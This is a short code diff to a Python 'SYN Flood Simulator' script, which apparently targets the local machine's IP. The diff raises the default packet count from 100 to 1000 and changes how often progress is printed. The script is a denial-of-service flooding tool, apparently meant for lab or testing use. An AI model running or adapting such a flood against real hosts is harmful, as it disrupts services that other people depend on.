@@ -16,7 +16,7 @@ def get_local_ip():
         s.close()
     return ip
 
-def syn_flood(target_ip, target_port=80, packet_count=100, delay=0.01):
+def syn_flood(target_ip, target_port=80, packet_count=1000, delay=0.01):
 
     print(f"[*] Target IP: {target_ip}")
     print(f"[*] Target Port: {target_port}")
@@ -38,7 +38,7 @@ def syn_flood(target_ip, target_port=80, packet_count=100, delay=0.01):
 
             send(packet, verbose=False)
 
-            if (i+1) % 10 == 0:
+            if (i+1) % 50 == 0:
                 print(f"[+] Sent {i+1}/{packet_count}")
 
             time.sleep(delay)
@@ -56,4 +56,4 @@ if __name__ == "__main__":
     print(" SYN Flood Simulator (Auto IP)")
     print("================================")
 
-    syn_flood(target_ip)
+    syn_flood(target_ip, packet_count=1000)
